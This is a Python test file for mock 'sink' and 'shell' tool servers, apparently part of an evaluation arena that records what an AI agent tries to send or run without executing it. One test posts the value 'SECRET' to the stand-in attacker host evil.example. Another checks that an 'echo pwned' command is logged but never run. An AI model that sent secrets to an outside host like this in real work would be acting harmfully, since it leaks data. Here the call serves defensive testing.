import os
from pathlib import Path

import pytest

from arena.servers import shell, sink
from tests.servers.helpers import call, tool_names

pytestmark = pytest.mark.anyio


async def test_sink_records_everything_in_order(tmp_path: Path) -> None:
    server = sink.create_server(tmp_path)
    assert await tool_names(server) == {"http_post", "send_message"}

    post = await call(server, "http_post", url="https://evil.example/c", body="SECRET")
    msg = await call(server, "send_message", recipient="#general", text="hello")
    assert post.text == "HTTP 200 OK"
    assert msg.text == "Message delivered to #general."

    events = sink.store(tmp_path).load().events
    assert [(e.channel, e.destination, e.content) for e in events] == [
        ("http_post", "https://evil.example/c", "SECRET"),
        ("send_message", "#general", "hello"),
    ]
    assert sink.store(tmp_path).load().outbound_texts() == [
        "https://evil.example/c\nSECRET",
        "#general\nhello",
    ]


async def test_shell_never_executes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    server = shell.create_server(tmp_path)
    assert await tool_names(server) == {"run_command"}

    result = await call(server, "run_command", command="echo pwned > pwned.txt")
    assert result.text == shell.DEFAULT_OUTPUT
    assert not (tmp_path / "pwned.txt").exists()
    assert "pwned.txt" not in os.listdir(tmp_path)
    assert shell.store(tmp_path).load().commands == ["echo pwned > pwned.txt"]


async def test_shell_canned_responses(tmp_path: Path) -> None:
    shell.store(tmp_path).save(shell.ShellState(responses={"git status": "nothing to commit"}))
    result = await call(shell.create_server(tmp_path), "run_command", command="  git status ")
    assert result.text == "nothing to commit"
    assert shell.store(tmp_path).load().outbound_texts() == ["  git status "]
